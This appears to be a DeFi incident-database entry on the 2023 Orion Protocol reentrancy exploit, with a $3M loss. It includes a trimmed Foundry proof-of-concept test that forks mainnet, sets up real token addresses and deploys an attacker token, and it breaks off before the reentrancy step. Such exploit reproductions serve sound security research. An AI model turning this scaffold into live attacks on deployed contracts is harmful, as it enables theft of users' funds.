# [?] - Orion Protocol - Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: Orion
Published: 2023-02-03
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Orion_exp.sol
Type: defi-exploit-poc

## Details
Lost: $3M
References:
- https://twitter.com/peckshield/status/1621337925228306433
- https://twitter.com/BlockSecTeam/status/1621263393054420992
- https://www.numencyber.com/analysis-of-orionprotocol-reentrancy-attack-with-poc/
- https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa

```solidity
contract ContractTest is Test {
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ORION Orion = ORION(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
    OrionPoolV2Factory Factory = OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Router_V3 RouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    uint256 flashAmount;
    IERC20 ATK;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_542_147);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(Orion), "ORION");
        vm.label(address(Factory), "Factory");
        vm.label(address(ATK), "ATK");
        vm.label(address(RouterV3), "RouterV3");
        vm.label(address(Pair), "Pair");
    }

    function testExploit() public {
        deal(address(USDT), address(this), 1e6); // set the USDT balance of exploiter is 1
        deal(address(USDC), address(this), 1e6); // set the USDC balance of exploiter is 1
        ATK = new ATKToken(address(this));
        addLiquidity();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Orion_exp.sol_
